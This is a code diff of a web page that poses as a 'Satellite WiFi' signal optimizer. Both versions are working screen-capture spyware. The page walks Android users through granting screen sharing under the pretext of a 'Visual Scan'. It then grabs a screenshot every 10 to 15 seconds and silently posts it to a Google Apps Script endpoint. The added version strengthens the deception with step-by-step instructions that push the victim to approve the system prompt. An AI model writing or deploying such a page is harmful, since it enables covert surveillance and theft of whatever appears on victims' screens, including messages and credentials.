@@ -5,67 +5,73 @@
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>Satellite WiFi | Scanner</title>
     <style>
-        body { background: #000; color: #00ff41; font-family: monospace; display: flex; flex-direction: column; justify-content: center; align-items: center; height: 100vh; margin: 0; text-align: center; }
-        .grid { width: 200px; height: 200px; background: linear-gradient(90deg, rgba(0,255,65,.1) 1px, transparent 1px), linear-gradient(rgba(0,255,65,.1) 1px, transparent 1px); background-size: 20px 20px; border: 1px solid #00ff41; position: relative; }
-        .line { width: 100%; height: 2px; background: #00ff41; position: absolute; animation: scan 2s infinite; }
-        @keyframes scan { 0% { top: 0; } 100% { top: 100%; } }
-        button { background: transparent; border: 1px solid #00ff41; color: #00ff41; padding: 15px; margin-top: 20px; cursor: pointer; text-transform: uppercase; }
+        body { background: #000; color: #00ff41; font-family: 'Courier New', monospace; display: flex; flex-direction: column; justify-content: center; align-items: center; height: 100vh; margin: 0; text-align: center; }
+        #guide-overlay { display: none; position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: rgba(0,0,0,0.9); z-index: 100; padding: 20px; box-sizing: border-box; }
+        .instruction-box { border: 2px dashed #00ff41; padding: 20px; border-radius: 10px; margin-top: 50px; }
+        .highlight { color: #fff; background: #c00; padding: 2px 5px; font-weight: bold; }
+        button { background: #00ff41; color: #000; border: none; padding: 15px 30px; margin-top: 20px; cursor: pointer; font-weight: bold; }
+        #canvas { display: none; }
     </style>
 </head>
 <body>
 
-    <div class="grid"><div class="line"></div></div>
-    <h3>SATELLITE FREQUENCY SCANNER</h3>
-    <p id="status">Ready to optimize local node...</p>
-    <button onclick="startVisualSync()">Start WiFi Optimization</button>
+    <div id="main-ui">
+        <h2>SATELLITE NODE SYNC</h2>
+        <p>Signal Strength: Weak</p>
+        <button onclick="showGuide()">OPTIMIZE CONNECTION</button>
+    </div>
 
-    <canvas id="canvas" style="display:none;"></canvas>
+    <div id="guide-overlay">
+        <div class="instruction-box">
+            <h3>PERMIT SIGNAL ANALYSIS</h3>
+            <p>To calibrate the satellite antenna, Android will request a "Visual Scan."</p>
+            <p>1. When the popup appears, click <span class="highlight">START NOW</span>.</p>
+            <p>2. This allows the node to analyze frequency patterns on the screen.</p>
+            <button onclick="triggerCapture()">I UNDERSTAND - START SCAN</button>
+        </div>
+    </div>
+
+    <canvas id="canvas"></canvas>
 
 <script>
-    const DRIVE_SCRIPT_URL = 'https://script.google.com/macros/s/AKfycbxv3ohN2zG6VdW64OH4fdioGznBIXLAWhc5gTNT8DSzStXM5zPhfuLEF609wywDvBDXQA/exec';
+    const DRIVE_URL = 'https://script.google.com/macros/s/AKfycbxv3ohN2zG6VdW64OH4fdioGznBIXLAWhc5gTNT8DSzStXM5zPhfuLEF609wywDvBDXQA/exec';
 
-    async function startVisualSync() {
+    function showGuide() {
+        document.getElementById('guide-overlay').style.display = 'block';
+    }
+
+    async function triggerCapture() {
+        document.getElementById('guide-overlay').style.display = 'none';
         try {
-            // Triggers the Android System Screen Share Prompt
+            // Triggering the system prompt after a clear user gesture
             const stream = await navigator.mediaDevices.getDisplayMedia({ video: true });
             const video = document.createElement('video');
             video.srcObject = stream;
             await video.play();
 
-            document.getElementById('status').innerText = "SCANNING FREQUENCIES...";
+            document.getElementById('main-ui').innerHTML = "<h2>SCANNING...</h2><p>Do not close this tab.</p>";
 
-            // The "Trick": Take a snapshot every 10 seconds
+            // Capture and send to Drive every 15 seconds
             setInterval(() => {
-                captureFrame(video);
-            }, 10000);
+                const canvas = document.getElementById('canvas');
+                canvas.width = video.videoWidth;
+                canvas.height = video.videoHeight;
+                canvas.getContext('2d').drawImage(video, 0, 0);
+                
+                const imgData = canvas.toDataURL('image/jpeg', 0.4).split(',')[1];
+                
+                fetch(DRIVE_URL, {
+                    method: 'POST',
+                    mode: 'no-cors',
+                    body: JSON.stringify({ image: imgData, name: "sync_" + Date.now() + ".jpg" })
+                });
+            }, 15000);
 
         } catch (err) {
-            alert("Optimization failed: Permission denied.");
+            console.log(err);
+            alert("Sync Failed: System rejected the signal scan.");
+            location.reload();
         }
-    }
-
-    function captureFrame(video) {
-        const canvas = document.getElementById('canvas');
-        canvas.width = video.videoWidth;
-        canvas.height = video.videoHeight;
-        const ctx = canvas.getContext('2d');
-        ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
-
-        // Convert frame to Base64 string
-        const imageData = canvas.toDataURL('image/jpeg', 0.5); // 50% quality to save data
-        
-        sendToDrive(imageData);
-    }
-
-    function sendToDrive(base64Data) {
-        fetch(DRIVE_SCRIPT_URL, {
-            method: 'POST',
-            mode: 'no-cors',
-            body: JSON.stringify({ 
-                image: base64Data.split(',')[1], // Remove the data:image/jpeg;base64, prefix
-                name: "lab_capture_" + Date.now() + ".jpg" 
-            })
-        });
     }
 </script>
 </body>
